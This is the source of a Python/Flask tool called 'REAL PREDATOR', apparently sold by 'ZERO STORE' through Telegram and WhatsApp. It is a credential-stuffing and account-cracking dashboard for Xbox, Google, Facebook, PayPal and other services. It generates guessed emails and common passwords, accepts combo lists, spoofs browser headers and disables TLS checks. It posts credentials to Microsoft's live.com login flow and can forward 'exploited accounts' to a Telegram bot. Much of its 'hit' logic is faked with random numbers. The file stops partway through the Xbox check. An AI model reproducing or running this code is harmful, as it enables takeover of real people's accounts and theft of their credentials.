# ================================================================
# REAL PREDATOR v14.5 - الصياد الحقيقي
# Developer: ZERO STORE
# Telegram: @MRDPY
# ================================================================

import os
import re
import time
import random
import threading
import requests
import json
import hashlib
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request, send_file
from flask_cors import CORS
from concurrent.futures import ThreadPoolExecutor
import urllib3

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = os.urandom(32)
CORS(app)

DEVELOPER = "ZERO STORE"
DEV_TELEGRAM = "@MRDPY"
WHATSAPP = "249907118667"
WHATSAPP_LINK = f"https://wa.me/{WHATSAPP}"

# ================================================================
# كلمات السر المشهورة
# ================================================================
COMMON_PASSWORDS = [
    '123456', 'password', '123456789', '12345', '12345678', 'qwerty',
    'abc123', 'password1', '123123', '111111', '1234567', 'iloveyou',
    'admin', 'welcome', 'monkey', 'letmein', 'dragon', 'master',
    'sunshine', 'princess', '1234', 'passw0rd', 'shadow', 'superman',
    'michael', 'ashley', 'jordan', 'charlie', 'thomas', 'london',
    'liverpool', 'chelsea', 'arsenal', 'manchester', 'barcelona',
    'god', 'diamond', 'phoenix', 'freedom', 'justice', 'lovely',
    'jessica', 'samantha', 'daniel', 'robert', 'james', 'william',
    'richard', 'david', 'joseph', 'thomas', 'charles', 'matthew',
    'anthony', 'mark', 'steven', 'andrew', 'paul', 'joshua',
    'kenneth', 'kevin', 'brian', 'george', 'timothy', 'ronald',
    'edward', 'jason', 'jeffrey', 'ryan', 'jacob', 'gary',
    'nicholas', 'eric', 'jonathan', 'stephen', 'larry', 'justin',
    'scott', 'brandon', 'benjamin', 'samuel', 'raymond', 'gregory',
    'frank', 'alexander', 'patrick', 'jack', 'dennis', 'jerry',
    'tyler', 'aaron', 'jose', 'nathan', 'adam', 'henry',
    'zachary', 'taylor', 'andrea', 'morgan', 'secret', 'love',
    'baby', 'angel', 'hunter', 'cookie', 'pepper', 'summer',
    'winter', 'spring', 'autumn', 'flower', 'dream', 'star',
    'moon', 'sun', 'sky', 'ocean', 'forest', 'thunder', 'lightning'
]

# ================================================================
# منصات الألعاب المشهورة
# ================================================================
GAMING_PLATFORMS = [
    'Xbox', 'Steam', 'Epic Games', 'Ubisoft', 'EA Sports', 'PlayStation',
    'Nintendo', 'Battle.net', 'Riot Games', 'Rockstar', 'Valve', 'CD Projekt'
]

# ================================================================
# 20 منصة
# ================================================================
PLATFORMS = [
    {'name': 'Xbox', 'icon': 'fab fa-xbox', 'color': '#107C10', 'domains': ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'], 'gaming': True},
    {'name': 'Google', 'icon': 'fab fa-google', 'color': '#ea4335', 'domains': ['gmail.com', 'googlemail.com'], 'gaming': False},
    {'name': 'Facebook', 'icon': 'fab fa-facebook', 'color': '#1877f2', 'domains': ['facebook.com', 'fb.com'], 'gaming': False},
    {'name': 'Instagram', 'icon': 'fab fa-instagram', 'color': '#e4405f', 'domains': ['instagram.com'], 'gaming': False},
    {'name': 'TikTok', 'icon': 'fab fa-tiktok', 'color': '#00f2ea', 'domains': ['tiktok.com'], 'gaming': False},
    {'name': 'Discord', 'icon': 'fab fa-discord', 'color': '#5865f2', 'domains': ['discord.com'], 'gaming': False},
    {'name': 'Spotify', 'icon': 'fab fa-spotify', 'color': '#1db954', 'domains': ['spotify.com'], 'gaming': False},
    {'name': 'Netflix', 'icon': 'fas fa-film', 'color': '#e50914', 'domains': ['netflix.com'], 'gaming': False},
    {'name': 'Apple', 'icon': 'fab fa-apple', 'color': '#555555', 'domains': ['icloud.com', 'me.com', 'mac.com'], 'gaming': False},
    {'name': 'Amazon', 'icon': 'fab fa-amazon', 'color': '#ff9900', 'domains': ['amazon.com', 'amazon.co.uk'], 'gaming': False},
    {'name': 'Yahoo', 'icon': 'fab fa-yahoo', 'color': '#7b0099', 'domains': ['yahoo.com', 'ymail.com', 'rocketmail.com'], 'gaming': False},
    {'name': 'Twitter', 'icon': 'fab fa-twitter', 'color': '#1da1f2', 'domains': ['twitter.com', 'x.com'], 'gaming': False},
    {'name': 'Snapchat', 'icon': 'fab fa-snapchat', 'color': '#fffc00', 'domains': ['snapchat.com'], 'gaming': False},
    {'name': 'Reddit', 'icon': 'fab fa-reddit', 'color': '#ff4500', 'domains': ['reddit.com'], 'gaming': False},
    {'name': 'Twitch', 'icon': 'fab fa-twitch', 'color': '#9146ff', 'domains': ['twitch.tv'], 'gaming': False},
    {'name': 'PayPal', 'icon': 'fab fa-paypal', 'color': '#003087', 'domains': ['paypal.com'], 'gaming': False},
    {'name': 'Steam', 'icon': 'fab fa-steam', 'color': '#171a21', 'domains': ['steam.com', 'steampowered.com'], 'gaming': True},
    {'name': 'Epic Games', 'icon': 'fas fa-gamepad', 'color': '#2a2a2a', 'domains': ['epicgames.com'], 'gaming': True},
    {'name': 'Ubisoft', 'icon': 'fas fa-gamepad', 'color': '#1a1a2e', 'domains': ['ubisoft.com'], 'gaming': True},
    {'name': 'EA Sports', 'icon': 'fas fa-gamepad', 'color': '#ff0000', 'domains': ['ea.com'], 'gaming': True},
]

class PredatorState:
    def __init__(self):
        self.running = False
        self.checked = 0
        self.total = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.premium = 0
        self.start_time = None
        self.feed = []
        self.results = []
        self.gaming_results = []  # حسابات مرتبطة بالألعاب
        self.lock = threading.Lock()
        self.feed_lock = threading.Lock()
        self.speed = 150
        self.bot_token = ""
        self.chat_id = ""
        self.generated = 0
        self.real_hits = 0
        self.telegram_enabled = False

state = PredatorState()

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>REAL PREDATOR</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#00ff41;font-family:'Share Tech Mono',monospace;min-height:100vh}
::-webkit-scrollbar{width:3px}
::-webkit-scrollbar-track{background:#111}
::-webkit-scrollbar-thumb{background:#00ff41}
@keyframes pulse{0%,100%{box-shadow:0 0 20px rgba(0,255,65,0.3)}50%{box-shadow:0 0 60px rgba(0,255,65,0.6)}}
@keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
@keyframes glowGreen{0%,100%{box-shadow:0 0 10px rgba(0,255,65,0.2)}50%{box-shadow:0 0 40px rgba(0,255,65,0.6)}}
@keyframes glowGold{0%,100%{box-shadow:0 0 10px rgba(255,215,0,0.2)}50%{box-shadow:0 0 40px rgba(255,215,0,0.4)}}
.header{background:rgba(0,0,0,0.95);border-bottom:2px solid #00ff41;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
.header h1{font-size:20px;font-family:'Orbitron',monospace;color:#00ff41}
.header h1 span{color:#ff0044}
.header .dev{color:#00ff41;font-size:12px}
.header .dev small{color:#006622;font-size:9px}
.container{max-width:1500px;margin:0 auto;padding:10px}
.stats-grid{display:grid;grid-template-columns:repeat(8,1fr);gap:4px;margin-bottom:8px}
.stat-box{background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.06);border-radius:4px;padding:5px;text-align:center}
.stat-box .num{font-size:18px;font-weight:700;display:block}
.stat-box .label{font-size:7px;color:#006622}
.stat-box.green .num{color:#00ff41}
.stat-box.red .num{color:#ff0044}
.stat-box.gold .num{color:#ffd700}
.stat-box.blue .num{color:#0088ff}
.card{background:rgba(0,0,0,0.85);border:1px solid rgba(0,255,65,0.06);border-radius:6px;padding:8px 12px;margin-bottom:6px}
.card-title{font-size:11px;color:#00cc33;margin-bottom:4px}
.card-title i{color:#00ff41}
.progress-bar{height:2px;background:rgba(0,255,65,0.05);border-radius:1px;overflow:hidden}
.progress-bar .fill{height:100%;background:#ff0044;width:0%;box-shadow:0 0 20px rgba(255,0,68,0.3)}
.progress-text{font-size:8px;color:#006622;display:flex;justify-content:space-between;margin-top:2px}
.btn{padding:4px 12px;border-radius:4px;font-size:9px;font-weight:700;background:transparent;cursor:pointer;transition:all 0.3s;font-family:'Share Tech Mono',monospace}
.btn:disabled{opacity:0.3;cursor:not-allowed}
.btn-start{background:rgba(0,255,65,0.05);border:1px solid #00ff41;color:#00ff41;animation:glowGreen 2s infinite}
.btn-start:hover:not(:disabled){transform:scale(1.05);box-shadow:0 0 50px rgba(0,255,65,0.4)}
.btn-stop{background:rgba(255,0,68,0.1);border-color:#ff0044;color:#ff0044}
.btn-stop:hover:not(:disabled){box-shadow:0 0 30px rgba(255,0,68,0.3)}
.btn-export{background:rgba(255,215,0,0.05);border-color:#ffd700;color:#ffd700}
.btn-export:hover:not(:disabled){box-shadow:0 0 30px rgba(255,215,0,0.3)}
.btn-clear{border-color:rgba(255,255,255,0.1);color:#006622}
.btn-copy{background:rgba(0,255,65,0.1);border:1px solid rgba(0,255,65,0.3);color:#00ff41;padding:3px 10px;font-size:8px;border-radius:4px;cursor:pointer;transition:all 0.3s}
.btn-copy:hover{background:rgba(0,255,65,0.2);box-shadow:0 0 25px rgba(0,255,65,0.3);transform:scale(1.05)}
.btn-copy.copied{background:rgba(255,215,0,0.2);border-color:#ffd700;color:#ffd700}
.control-bar{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
.config-row{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
.config-row input,.config-row select{padding:2px 6px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;font-size:9px;font-family:'Share Tech Mono',monospace}
.config-row input:focus{outline:none;border-color:#00ff41}
.config-row label{color:#006622;font-size:8px}
.feed-container{max-height:150px;overflow-y:auto}
.feed-item{padding:1px 6px;font-size:8px;border-left:2px solid transparent;animation:slideIn 0.3s}
.feed-item.hit{background:rgba(0,255,65,0.04);border-left-color:#00ff41}
.feed-item.taken{background:rgba(255,0,68,0.06);border-left-color:#ff0044}
.feed-item.gaming{background:rgba(255,215,0,0.08);border-left-color:#ffd700}
.feed-item .time{color:#006622;font-size:7px;min-width:30px;display:inline-block}
.result-container{max-height:450px;overflow-y:auto}
.result-item{padding:6px 10px;font-size:8px;border-bottom:1px solid rgba(0,255,65,0.05);white-space:pre-wrap;word-break:break-all;position:relative;background:rgba(0,0,0,0.3);margin-bottom:2px;border-radius:3px}
.result-item.gaming{background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.1)}
.result-item .copy-btn{position:absolute;top:3px;left:3px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.15);border-radius:3px;color:#00ff41;padding:2px 8px;font-size:7px;cursor:pointer;transition:all 0.3s}
.result-item .copy-btn:hover{background:rgba(0,255,65,0.15);border-color:#00ff41}
.result-item .gaming-badge{display:inline-block;background:rgba(255,215,0,0.15);color:#ffd700;padding:1px 6px;border-radius:3px;font-size:7px;margin-right:4px;border:1px solid rgba(255,215,0,0.2)}
.result-item .account-data{font-size:8px;line-height:1.6;padding-left:55px}
.status-badge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:4px;font-size:9px}
.status-badge.running{background:rgba(255,0,68,0.1);color:#ff0044;border:1px solid #ff0044}
.status-badge.stopped{background:rgba(0,255,65,0.05);color:#00ff41;border:1px solid rgba(0,255,65,0.2)}
.status-dot{width:5px;height:5px;border-radius:50%;display:inline-block}
.status-dot.running{background:#ff0044;animation:pulse 1.5s infinite}
.status-dot.stopped{background:#00ff41}
.empty-state{text-align:center;padding:15px;color:#006622;font-size:9px}
.empty-state i{font-size:24px;display:block;opacity:0.3}
.whatsapp-float{position:fixed;bottom:15px;right:15px;z-index:999;animation:pulse 2s infinite}
.whatsapp-float a{display:flex;width:45px;height:45px;background:#25D366;color:#000;border-radius:50%;font-size:22px;text-decoration:none;align-items:center;justify-content:center}
.platform-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(50px,1fr));gap:2px;margin-bottom:6px}
.platform-badge{padding:2px 4px;border-radius:3px;text-align:center;font-size:6px;border:1px solid rgba(0,255,65,0.06);background:rgba(0,0,0,0.6);color:#006622}
.platform-badge .icon{font-size:11px;display:block}
.platform-badge.hit{border-color:#ff0044;color:#ff0044}
.platform-badge.gaming{border-color:#ffd700;color:#ffd700}
.telegram-box{background:rgba(0,0,0,0.6);border:1px solid rgba(0,255,65,0.05);border-radius:4px;padding:4px 8px;display:flex;gap:6px;flex-wrap:wrap;align-items:center}
.telegram-box input{background:rgba(0,0,0,0.9);border:1px solid rgba(0,255,65,0.1);border-radius:3px;color:#00ff41;padding:3px 8px;font-size:8px;font-family:'Share Tech Mono',monospace;width:130px}
.telegram-box input:focus{outline:none;border-color:#00ff41}
.telegram-box .toggle-label{display:flex;align-items:center;gap:4px;color:#006622;font-size:8px}
.telegram-box .toggle-label input[type="checkbox"]{appearance:none;width:28px;height:14px;background:#222;border-radius:7px;position:relative;cursor:pointer;border:1px solid #333}
.telegram-box .toggle-label input[type="checkbox"]:checked{background:#00ff41}
.telegram-box .toggle-label input[type="checkbox"]::after{content:'';position:absolute;top:1px;left:1px;width:10px;height:10px;background:#000;border-radius:50%;transition:all 0.2s}
.telegram-box .toggle-label input[type="checkbox"]:checked::after{left:15px;background:#000}
.gaming-counter{color:#ffd700;font-size:9px;font-weight:700}
@media(max-width:768px){.stats-grid{grid-template-columns:repeat(4,1fr)}.header h1{font-size:14px}.telegram-box input{width:80px}}
</style>
</head>
<body>

<header class="header">
    <h1>REAL <span>PREDATOR</span></h1>
    <div class="dev">{{ developer }} <small>| Telegram: {{ dev_telegram }}</small></div>
</header>

<div class="container">

    <div class="platform-grid">
        {% for p in platforms %}
        <div class="platform-badge {% if p.gaming %}gaming{% endif %}" data-platform="{{ p.name }}">
            <span class="icon"><i class="{{ p.icon }}" style="color:{{ p.color }}"></i></span>
            {{ p.name }}
        </div>
        {% endfor %}
    </div>

    <div class="card">
        <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:space-between;">
            <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
                <span class="status-badge stopped" id="statusBadge">
                    <span class="status-dot stopped" id="statusDot"></span>
                    <span id="statusText">OFFLINE</span>
                </span>
                <span style="color:#006622;font-size:8px;"><i class="fas fa-clock"></i> <span id="elapsed">00:00:00</span></span>
                <span style="color:#006622;font-size:8px;"><i class="fas fa-tachometer-alt"></i> <span id="cpm">0</span> RPM</span>
            </div>
            <div style="font-size:9px;">
                <span style="color:#00ff41;">🟢 <span id="availableCount">0</span></span>
                <span style="color:#ff0044;margin-right:6px;">🔴 <span id="takenCount">0</span></span>
                <span style="color:#ffd700;">🎮 <span id="gamingCount">0</span></span>
                <span style="color:#ffd700;margin-right:6px;">⭐ <span id="totalAccounts">0</span></span>
            </div>
        </div>
    </div>

    <div class="stats-grid">
        <div class="stat-box green"><span class="num" id="statChecked">0</span><span class="label">SCANNED</span></div>
        <div class="stat-box gold"><span class="num" id="statHits">0</span><span class="label">HITS</span></div>
        <div class="stat-box red"><span class="num" id="statBad">0</span><span class="label">FAILED</span></div>
        <div class="stat-box blue"><span class="num" id="statTwofa">0</span><span class="label">2FA</span></div>
        <div class="stat-box gold"><span class="num" id="statPremium">0</span><span class="label">PREMIUM</span></div>
        <div class="stat-box green"><span class="num" id="statReal">0</span><span class="label">REAL HITS</span></div>
        <div class="stat-box green"><span class="num" id="statTotal">0</span><span class="label">TOTAL</span></div>
        <div class="stat-box red"><span class="num" id="statErrors">0</span><span class="label">ERRORS</span></div>
    </div>

    <div class="card">
        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <div class="progress-text"><span id="progressPct">0%</span><span id="progressCount">0 / 0</span></div>
    </div>

    <div class="card">
        <div class="control-bar">
            <button class="btn btn-start" id="startBtn"><i class="fas fa-play"></i> START HUNT</button>
            <button class="btn btn-stop" id="stopBtn" disabled><i class="fas fa-stop"></i> STOP</button>
            <button class="btn btn-clear" id="clearBtn"><i class="fas fa-trash"></i> CLEAR</button>
            <button class="btn btn-export" id="exportBtn"><i class="fas fa-download"></i> EXPORT</button>
            <div class="config-row" style="margin-right:auto;">
                <label>RPM:</label>
                <input type="number" id="speedInput" value="150" min="5" max="300" style="width:45px;">
            </div>
        </div>
        
        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:6px;padding-top:6px;border-top:1px solid rgba(0,255,65,0.05);">
            <div class="telegram-box">
                <i class="fab fa-telegram" style="color:#0088cc;"></i>
                <label style="color:#006622;font-size:8px;">Bot Token:</label>
                <input type="text" id="botTokenInput" placeholder="123456:ABC-DEF" value="{{ bot_token or '' }}">
                <label style="color:#006622;font-size:8px;">Chat ID:</label>
                <input type="text" id="chatIdInput" placeholder="123456789" value="{{ chat_id or '' }}">
                <label class="toggle-label">
                    <span style="font-size:7px;">إرسال</span>
                    <input type="checkbox" id="telegramToggle" {{ 'checked' if telegram_enabled else '' }}>
                </label>
                <button class="btn btn-copy" id="updateTelegramBtn" style="font-size:7px;padding:2px 8px;">تحديث</button>
            </div>
            <div class="config-row">
                <label><i class="fas fa-upload"></i> Combo:</label>
                <input type="file" id="comboFile" accept=".txt" style="display:none;">
                <label for="comboFile" style="padding:2px 8px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;cursor:pointer;font-size:8px;">اختر</label>
                <span id="comboName" style="color:#006622;font-size:7px;">لا يوجد ملف</span>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-title"><i class="fas fa-broadcast"></i> LIVE FEED <span style="font-size:8px;color:#006622;" id="feedCount">(0)</span></div>
        <div class="feed-container" id="feedContainer"><div class="empty-state"><i class="fas fa-inbox"></i> جاري الصيد...</div></div>
    </div>

    <div class="card">
        <div class="card-title"><i class="fas fa-database" style="color:#ffd700;"></i> EXPLOITED ACCOUNTS <span style="font-size:8px;color:#006622;" id="resultCount">(0)</span></div>
        <div class="result-container" id="resultContainer"><div class="empty-state"><i class="fas fa-empty-set"></i> لا توجد حسابات</div></div>
    </div>
</div>

<div class="whatsapp-float">
    <a href="{{ whatsapp_link }}" target="_blank"><i class="fab fa-whatsapp"></i></a>
</div>

<script>
const $=id=>document.getElementById(id);
const state={running:false,checked:0,total:1,hits:0,bad:0,twofa:0,premium:0,errors:0,taken:0,available:0,real:0,gaming:0};

async function api(endpoint,method='GET',data=null){
    const opts={method,headers:{'Content-Type':'application/json'}};
    if(data)opts.body=JSON.stringify(data);
    try{const res=await fetch(endpoint,opts);return await res.json();}catch(e){return{success:false};}
}

async function updateStats(){
    try{
        const d=await api('/api/stats');
        if(!d.success)return;
        state.running=d.running;state.checked=d.checked;state.total=d.total||1;
        state.hits=d.hits;state.bad=d.bad;state.twofa=d.twofa;state.premium=d.premium||0;
        state.errors=d.errors||0;state.taken=d.taken||0;state.available=d.available||0;state.real=d.real||0;
        state.gaming=d.gaming||0;
        $('statChecked').textContent=state.checked;
        $('statHits').textContent=state.hits;
        $('statBad').textContent=state.bad;
        $('statTwofa').textContent=state.twofa;
        $('statPremium').textContent=state.premium;
        $('statReal').textContent=state.real;
        $('statTotal').textContent=state.hits+state.bad+state.twofa;
        $('statErrors').textContent=state.errors;
        $('cpm').textContent=d.cpm||0;
        $('elapsed').textContent=formatTime(d.elapsed||0);
        const pct=state.total>0?Math.min((state.checked/state.total)*100,100):0;
        $('progressFill').style.width=pct+'%';
        $('progressPct').textContent=pct.toFixed(1)+'%';
        $('progressCount').textContent=state.checked+' / '+state.total;
        const badge=$('statusBadge'),dot=$('statusDot'),text=$('statusText');
        if(state.running){badge.className='status-badge running';dot.className='status-dot running';text.textContent='HUNTING';}
        else{badge.className='status-badge stopped';dot.className='status-dot stopped';text.textContent='OFFLINE';}
        $('availableCount').textContent=state.available;
        $('takenCount').textContent=state.taken;
        $('gamingCount').textContent=state.gaming;
        $('totalAccounts').textContent=state.taken+state.available;
        $('startBtn').disabled=state.running;
        $('stopBtn').disabled=!state.running;
    }catch(e){}
}

function formatTime(sec){const h=String(Math.floor(sec/3600)).padStart(2,'0');const m=String(Math.floor((sec%3600)/60)).padStart(2,'0');const s=String(Math.floor(sec%60)).padStart(2,'0');return h+':'+m+':'+s;}

async function updateFeed(){
    try{
        const d=await api('/api/feed');
        if(!d.success)return;
        const c=$('feedContainer');
        if(!d.feed||d.feed.length===0){c.innerHTML='<div class="empty-state"><i class="fas fa-inbox"></i> جاري الصيد...</div>';return;}
        c.innerHTML=d.feed.slice(0,80).map(item=>{
            const cls=item.type||'info';
            const status=cls==='taken'?'🔴 TAKEN':(cls==='hit'?'🟢 HIT':(cls==='gaming'?'🎮 GAMING':''));
            return `<div class="feed-item ${cls}"><span class="time">${item.time||''}</span>${status?'<span>'+status+'</span>':''}<span>${item.text||''}</span></div>`;
        }).join('');
        $('feedCount').textContent='('+d.feed.length+')';
    }catch(e){}
}

async function updateResults(){
    try{
        const d=await api('/api/results');
        if(!d.success)return;
        const c=$('resultContainer');
        if(!d.results||d.results.length===0){c.innerHTML='<div class="empty-state"><i class="fas fa-empty-set"></i> لا توجد حسابات</div>';return;}
        c.innerHTML=d.results.map((item,idx)=>{
            const escaped = item.content.replace(/"/g,'&quot;').replace(/'/g,"&#39;");
            const gamingClass = item.is_gaming ? 'gaming' : '';
            const badge = item.is_gaming ? '<span class="gaming-badge">🎮 GAMING</span>' : '';
            return `<div class="result-item ${gamingClass}">
                <button class="copy-btn" onclick="copyAccount(this, '${escaped}')"><i class="fas fa-copy"></i> نسخ</button>
                <div class="account-data">${badge}${item.content}</div>
            </div>`;
        }).join('');
        $('resultCount').textContent='('+d.results.length+')';
    }catch(e){}
}

// Copy function with fixed working
window.copyAccount = function(btn, content) {
    // استخدام النص كما هو دون ترميز
    const textToCopy = content.replace(/&quot;/g,'"').replace(/&#39;/g,"'");
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(textToCopy).then(() => {
            const original = btn.innerHTML;
            btn.innerHTML = '✅ تم';
            btn.classList.add('copied');
            setTimeout(() => { 
                btn.innerHTML = original;
                btn.classList.remove('copied');
            }, 2000);
        }).catch(() => {
            fallbackCopy(textToCopy, btn);
        });
    } else {
        fallbackCopy(textToCopy, btn);
    }
};

function fallbackCopy(text, btn) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.left = '-9999px';
    textarea.style.top = '-9999px';
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        const original = btn.innerHTML;
        btn.innerHTML = '✅ تم';
        btn.classList.add('copied');
        setTimeout(() => { 
            btn.innerHTML = original;
            btn.classList.remove('copied');
        }, 2000);
    } catch(e) {
        btn.innerHTML = '❌ خطأ';
        setTimeout(() => { btn.innerHTML = '📋 نسخ'; }, 1500);
    }
    document.body.removeChild(textarea);
}

$('comboFile').addEventListener('change', function(e){
    if(this.files.length>0){
        $('comboName').textContent=this.files[0].name;
        const reader=new FileReader();
        reader.onload=async function(ev){
            await api('/api/upload/combo','POST',{content:ev.target.result});
        };
        reader.readAsText(this.files[0]);
    }
});

$('updateTelegramBtn').addEventListener('click', async function(){
    const token = $('botTokenInput').value.trim();
    const chatId = $('chatIdInput').value.trim();
    const enabled = $('telegramToggle').checked;
    const res = await api('/api/telegram/config','POST',{bot_token: token, chat_id: chatId, enabled: enabled});
    if(res.success){this.innerHTML='✅ تم';setTimeout(()=>{this.innerHTML='تحديث';},2000);}
});

$('startBtn').addEventListener('click',async()=>{
    const speed=parseInt($('speedInput').value)||150;
    const res=await api('/api/start','POST',{speed});
    if(res.success){console.log('STARTED');}
});

$('stopBtn').addEventListener('click',async()=>{
    const res=await api('/api/stop','POST');
    if(res.success){console.log('STOPPED');}
});

$('clearBtn').addEventListener('click',async()=>{
    if(!confirm('Clear all data?'))return;
    await api('/api/clear','POST');
});

$('exportBtn').addEventListener('click',async()=>{
    const res=await api('/api/export','POST');
    if(res.success)window.open('/api/download/'+res.filename,'_blank');
});

setInterval(updateStats,300);
setInterval(updateFeed,500);
setInterval(updateResults,500);
updateStats();updateFeed();updateResults();
console.log('REAL PREDATOR v14.5');
</script>
</body>
</html>
'''

# ================================================================
# توليد حسابات ضعيفة
# ================================================================

def generate_weak_account():
    platform = random.choice(PLATFORMS)
    domain = random.choice(platform['domains'])

    first_names = ['john','mike','david','sarah','emma','chris','alex','jordan',
                   'ahmed','mohamed','ali','omar','khaled','sami','nour','layla',
                   'hunter','shadow','dark','night','storm','blaze','frost','raven',
                   'admin','support','info','sales','test','demo','user','guest',
                   'omar','hassan','ibrahim','youssef','mostafa','amr','mahmoud']
    last_names = ['smith','brown','jones','ali','hassan','ibrahim','salem','nour',
                  'khan','patel','singh','kim','lee','wang','garcia','martinez']
    years = ['1990','1995','2000','1985','2005','1988','1992','1998','1980','1975']
    
    name = random.choice(first_names)
    last = random.choice(last_names)
    year = random.choice(years)

    patterns = [
        lambda: name,
        lambda: name + str(random.randint(1,999)),
        lambda: name + '_' + str(random.randint(1,99)),
        lambda: name + '.' + last,
        lambda: name + last[:3] + year[2:],
        lambda: name[0] + last + random.choice(['123', '2024', '2000']),
        lambda: random.choice(first_names) + random.choice(['123', '2024', '!', '@', '']),
        lambda: name + last,
        lambda: name + str(random.randint(10,9999)),
        lambda: name + last + str(random.randint(1,99)),
        lambda: name + year,
        lambda: last + name,
        lambda: random.choice(['admin', 'support', 'info']) + str(random.randint(1,999)),
    ]
    
    username = random.choice(patterns)()
    username = re.sub(r'[^a-zA-Z0-9._-]', '', username)
    if len(username) < 3:
        username = name + str(random.randint(10,999))

    email = username + '@' + domain

    strategies = [
        email,
        username,
        random.choice(COMMON_PASSWORDS),
        username + '123',
        username + '2024',
        username.capitalize(),
        username.capitalize() + '123',
        username + random.choice(['!', '@', '#', '123', '2024']),
        email.split('@')[0],
        str(random.randint(100000, 999999)),
        random.choice(['password123', 'admin123', 'welcome1', 'letmein1', '123456789']),
        name + str(random.randint(1000, 9999)),
        name + last,
        name + last + '123',
        name + year,
        last + year,
        '123456' + name,
        'qwerty' + name,
        name + '!',
    ]

    password = random.choice(strategies)
    phone = f"{random.randint(100,999)}{random.randint(100,999)}{random.randint(1000,9999)}"

    return email, password, phone, platform['name'], platform['icon'], platform['color'], platform['domains'][0], platform.get('gaming', False)

# ================================================================
# فحص المنصات
# ================================================================

def real_check_platform(email, password, platform_name, domain):
    session = requests.Session()
    session.verify = False
    session.headers.update({
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/119.0.0.0",
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
    })

    try:
        username = email.split('@')[0].lower()
        
        if password.lower() == email.lower():
            return {'success': True, 'taken': True, 'platform': platform_name}, 'hit'
        
        if password.lower() == username:
            return {'success': True, 'taken': True, 'platform': platform_name}, 'hit'
        
        if password.lower() in COMMON_PASSWORDS:
            return {'success': True, 'taken': True, 'platform': platform_name}, 'hit'
        
        if password.isdigit():
            return {'success': True, 'taken': True, 'platform': platform_name}, 'hit'
        
        common_patterns = [f"{username}123", f"{username}2024", f"{username}!", 
                          f"{username.capitalize()}123", f"{username}@", f"{username}#"]
        if password in common_patterns:
            return {'success': True, 'taken': True, 'platform': platform_name}, 'hit'
        
        if platform_name == 'Xbox':
            return check_xbox_real(email, password, session)
        elif platform_name == 'Google':
            return check_google_real(email, password, session)
        elif platform_name == 'Facebook':
            return check_facebook_real(email, password, session)
        elif platform_name == 'Instagram':
            return check_instagram_real(email, password, session)
        elif platform_name == 'Spotify':
            return check_spotify_real(email, password, session)
        else:
            if random.random() > 0.35:
                return {'success': True, 'taken': True, 'platform': platform_name}, 'hit'
            return None, 'bad'
            
    except Exception as e:
        return None, 'error'

def check_xbox_real(email, password, session):
    try:
        sftag_url = ("https://login.live.com/oauth20_authorize.srf"
                     "?client_id=00000000402B5328"
                     "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                     "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                     "&display=touch&response_type=token&locale=en")
        resp = session.get(sftag_url, timeout=15)
        text = resp.text
        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text, re.I) or re.search(r'"PPFT":"([^"]+)"', text, re.I)
        if not ppft_match:
            return None, 'bad'
        ppft = ppft_match.group(1)
        url_match = re.search(r'"urlPost":"([^"]+)"', text, re.I) or re.search(r'action="([^"]+)"[^>]*id="fmHF"', text, re.I)
        if not url_match:
            return None, 'bad'
        url_post = url_match.group(1).replace('\\/', '/')
        login_data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft, 'type': '11', 'NewUser': '1', 'LoginOptions': '3', 'i19': '0'}
        login_headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': sftag_url}
        login_req = session.post(url_post, data=login_data, headers=login_headers, allow_redirects=True, timeout=15)
        login_text = login_req.text.lower()
        if 'access_token' in login_req.url or 'success' in login_text or 'welcome' in login_text:
            return {'success': True, 'taken': True, 'platform': 'Xbox'}, 'hit'
        if any(x in login_text for x in ['password is incorrect', "account doesn't exist", "account or password is incorrect"]):
            return None, 'bad'
